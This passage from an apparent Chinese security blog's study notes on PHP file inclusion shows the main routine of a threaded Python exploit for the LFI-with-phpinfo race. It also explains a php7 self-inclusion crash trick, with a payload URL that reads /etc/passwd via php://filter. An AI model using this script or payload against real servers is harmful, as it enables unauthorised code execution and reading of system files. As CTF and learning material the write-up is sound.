+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">banner</span> <span class="o">=</span> <span class="s2">&#34;LFI with phpinfo()</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">banner</span> <span class="o">+=</span> <span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">30</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">usage</span> <span class="o">=</span> <span class="s2">&#34;python </span><span class="si">{prog}</span><span class="s2"> host [port] [threads]. -h for help&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">ArgumentParser</span><span class="p">(</span><span class="n">usage</span><span class="o">=</span><span class="n">usage</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;host&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;ip or domain, e.g. 127.0.0.1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;port&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">help</span><span class="o">=</span><span class="s2">&#34;port, default is 80&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;threads&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">help</span><span class="o">=</span><span class="s2">&#34;use n threads to access, default is 10&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">host</span>
+</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span>
+</span></span><span class="line"><span class="cl">    <span class="n">poolsz</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">threads</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">host</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">err_msg</span> <span class="o">=</span> <span class="s2">&#34;Error with hostname </span><span class="si">{h}</span><span class="s2">:</span><span class="si">{err}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">h</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">err</span><span class="o">=</span><span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="n">err_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">info_msg</span> <span class="o">=</span> <span class="s2">&#34;Getting initial offset ...&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">info_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">lfi_req</span> <span class="o">=</span> <span class="n">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="c1">#debug_msg = &#39;\n\n&#39;.join([req, tag, lfi_req])</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#log.debug(debug_msg)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">offset</span> <span class="o">=</span> <span class="n">getoffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">req</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">maxattempts</span> <span class="o">=</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">    <span class="n">event</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lock</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">tp</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">poolsz</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ThreadWorker</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">lock</span><span class="p">,</span> <span class="n">maxattempts</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">req</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">lfi_req</span><span class="p">,</span> <span class="n">tag</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="ow">not</span> <span class="n">event</span><span class="o">.</span><span class="n">wait</span><span class="p">(</span><span class="mf">0.5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="n">lock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="si">% 4d</span><span class="s2"> / </span><span class="si">% 4d</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">counter</span><span class="p">,</span> <span class="n">maxattempts</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="n">maxattempts</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="n">info_msg</span> <span class="o">=</span> <span class="s2">&#34;Wowo! \m/&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">info_msg</span> <span class="o">=</span> <span class="s2">&#34;:(&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">info_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info_msg</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Telling threads to shutdown...&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">info_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="n">info_msg</span> <span class="o">=</span> <span class="s2">&#34;Shutting down...&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">info_msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x05-自包含php7segmentfault">0x05 自包含、php7SegmentFault</h2>
+<p>/a.php?include=a.php<br>
+这样a.php会将它本身包含进来，而被包含进来的a.php再次尝试处理url的包含请求时，再次将自己包含进来，形成了无穷递归，递归会导致爆栈，使php无法进行此次请求的后续处理，然后就能进行包含啦！</p>
+<p>本地文件包含漏洞可以让 php 包含自身从而导致死循环,然后 php 就会崩溃 ，如果请求中同时存在一个上传文件的请求的话 , 这个文件就会被保留，include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</p>
+<p>参考：<a href="https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noopener noreffer ">https://www.jianshu.com/p/dfd049924258</a></a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-03-12</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛文件包含学习笔记" data-hashtags="Web安全,CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-hashtag="Web安全"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛文件包含学习笔记"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛文件包含学习笔记"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-title="安全牛文件包含学习笔记"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>,&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-03-08-overthewirebandit/" class="prev" rel="prev" title="OverTheWire:Bandit"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>OverTheWire:Bandit</a>
+            <a href="/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/" class="next" rel="next" title="攻防世界web高手篇（001-010）">攻防世界web高手篇（001-010）<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
